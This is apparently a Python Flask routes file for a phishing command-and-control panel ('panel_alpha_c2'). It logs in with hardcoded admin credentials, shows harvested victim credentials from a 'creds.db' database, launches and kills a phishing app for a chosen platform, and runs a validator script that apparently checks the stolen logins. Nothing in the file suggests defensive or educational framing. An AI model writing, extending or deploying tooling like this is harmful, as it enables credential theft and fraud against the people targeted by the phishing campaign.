from flask import Blueprint, render_template, request, redirect, url_for, session
import sqlite3
import os
import subprocess
import signal
from .auth import login_required

phishing_process = None
routes = Blueprint('routes', __name__)

@routes.route('/panel_alpha_c2/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'secret123':
            session['logged_in'] = True
            return redirect(url_for('routes.dashboard'))
    return render_template('login.html')

@routes.route('/panel_alpha_c2/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('routes.login'))

@routes.route('/panel_alpha_c2')
@login_required
def dashboard():
    BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
    DB_PATH = os.path.join(BASE_DIR, 'creds.db')
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credentials ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return render_template('dashboard.html', credentials=rows)

@routes.route('/launch/<platform>')
def launch_phishing(platform):
    global phishing_process

    if phishing_process:
        phishing_process.terminate()

    phishing_app_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../app.py'))

    phishing_process = subprocess.Popen(
        ['python3', phishing_app_path, platform],
        #DEBUG
        print(f"[~] Lanzando phishing para {platform}..."),
        print(f"[~] Ejecutando: python3 {phishing_app_path} {platform}"),
        stdout=open("phishing_stdout.log", "w"),
        stderr=open("phishing_stderr.log", "w"),
        start_new_session=True
        #DEBUG
        #stdout=subprocess.PIPE,
        #stderr=subprocess.PIPE
    )

    return redirect(url_for('routes.dashboard'))

@routes.route('/stop_phishing')
def stop_phishing():
    global phishing_process

    if phishing_process:
        os.killpg(os.getpgid(phishing_process.pid), signal.SIGTERM)
        phishing_process = None

    return redirect(url_for('routes.dashboard'))

@routes.route('/validate_now')
def validate_now():
    validator_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../app/validator.py'))

    try:
        subprocess.Popen(['python3', validator_path])
    except Exception as e:
        print(f"Error when trying to execute validator: {e}")

    return redirect(url_for('routes.dashboard'))
